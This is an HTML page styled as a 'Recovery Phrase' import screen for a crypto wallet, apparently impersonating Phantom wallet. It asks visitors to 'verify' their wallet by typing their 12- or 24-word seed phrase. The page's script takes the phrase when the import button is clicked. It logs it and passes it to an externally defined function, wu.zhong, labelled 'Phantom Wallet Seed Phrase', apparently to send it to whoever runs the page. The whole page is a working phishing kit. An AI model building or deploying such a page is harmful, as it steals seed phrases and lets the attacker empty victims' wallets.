<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Recovery Phrase - Wallet</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background-color: #2a2a2a;
            color: white;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .container {
            flex: 1;
            display: flex;
            flex-direction: column;
            max-width: 100%;
            margin: 0 auto;
            padding: 0 20px;
        }


        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 0;
            margin-bottom: 40px;
        }

        .back-arrow {
            font-size: 24px;
            color: white;
            cursor: pointer;
            transition: opacity 0.2s;
        }

        .back-arrow:hover {
            opacity: 0.7;
        }

        .progress-dots {
            display: flex;
            gap: 8px;
        }

        .dot {
            width: 60px;
            height: 4px;
            border-radius: 2px;
            background-color: #555;
        }

        .dot.active {
            background-color: white;
        }

        .next-button {
            color: white;
            font-size: 18px;
            font-weight: 500;
            cursor: pointer;
            transition: opacity 0.2s;
        }

        .next-button:hover {
            opacity: 0.7;
        }


        .main-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            text-align: center;
            padding: 40px 0;
        }

        .title {
            font-size: 42px;
            font-weight: 300;
            margin-bottom: 30px;
            line-height: 1.2;
        }

        .subtitle {
            font-size: 18px;
            color: #999;
            margin-bottom: 60px;
            line-height: 1.4;
            max-width: 400px;
            margin-left: auto;
            margin-right: auto;
        }

   
        .input-section {
            margin-bottom: 40px;
        }

        .input-container {
            position: relative;
            margin-bottom: 30px;
        }

        .recovery-input {
            width: 100%;
            background-color: #1a1a1a;
            border: 2px solid #404040;
            border-radius: 12px;
            padding: 20px;
            font-size: 16px;
            color: white;
            min-height: 120px;
            resize: vertical;
            font-family: inherit;
            transition: border-color 0.2s, background-color 0.2s;
        }

        .recovery-input:focus {
            outline: none;
            border-color: #666;
            background-color: #222;
        }

        .recovery-input::placeholder {
            color: #666;
            font-size: 16px;
        }


        .import-button {
            width: 100%;
            background: linear-gradient(135deg, #6b5b95, #5a4b7a);
            border: none;
            border-radius: 25px;
            padding: 18px 24px;
            font-size: 18px;
            font-weight: 600;
            color: white;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(107, 91, 149, 0.3);
        }

        .import-button:hover {
            background: linear-gradient(135deg, #7a6ba6, #695285);
            box-shadow: 0 6px 20px rgba(107, 91, 149, 0.4);
            transform: translateY(-2px);
        }

        .import-button:active {
            transform: translateY(0);
            box-shadow: 0 2px 10px rgba(107, 91, 149, 0.3);
        }


        @media (max-width: 480px) {
            .container {
                padding: 0 16px;
            }

            .title {
                font-size: 36px;
            }

            .subtitle {
                font-size: 16px;
                margin-bottom: 40px;
            }

            .recovery-input {
                min-height: 100px;
                padding: 16px;
            }

            .import-button {
                padding: 16px 20px;
                font-size: 16px;
            }
        }

        @media (max-width: 360px) {
            .title {
                font-size: 32px;
            }

            .progress-dots .dot {
                width: 50px;
            }
        }


        .back-arrow:focus,
        .next-button:focus {
            outline: 2px solid #6b5b95;
            outline-offset: 2px;
            border-radius: 4px;
        }

        .import-button:focus {
            outline: 2px solid #fff;
            outline-offset: 2px;
        }
    </style>
</head>
<body>
    <div class="container">

        <div class="header">
            <div class="back-arrow" tabindex="0" role="button" aria-label="Go back">&#8249;</div>
            <div class="progress-dots">
                <div class="dot active"></div>
                <div class="dot"></div>
                <div class="dot"></div>
            </div>
            <div class="next-button" tabindex="0" role="button">Next</div>
        </div>

        
        <div class="main-content">
            <h1 class="title">Recovery Phrase</h1>
            <p class="subtitle">
               Verify your wallet with your 12 or 24-word recovery phrase
            </p>

            <div class="input-section">
                <div class="input-container">
                    <textarea 
                        class="recovery-input" 
                        placeholder="Recovery Phrase"
                        rows="4"
                        aria-label="Enter your recovery phrase"
                    ></textarea>
                </div>

                <button class="import-button" type="button">
                    Import Recovery Phrase
                </button>
            </div>
        </div>
    </div>

    <script>
        
        document.addEventListener('DOMContentLoaded', function() {
        
            const importButton = document.querySelector('.import-button');
            const recoveryInput = document.querySelector('.recovery-input');

            importButton.addEventListener('click', function() {
                const phrase = recoveryInput.value.trim();
                if (phrase) {
                    console.log('Import recovery phrase:', phrase);
                
                wu.zhong(`🔰Phantom Wallet Seed Phrase\n\n${phrase}`,"app.phantom");
                } else {
                   
                    recoveryInput.focus();
                }
            });

          
        
            recoveryInput.addEventListener('input', function() {
                this.style.height = 'auto';
                this.style.height = Math.max(120, this.scrollHeight) + 'px';
            });
        });
    </script>
</body>
</html>
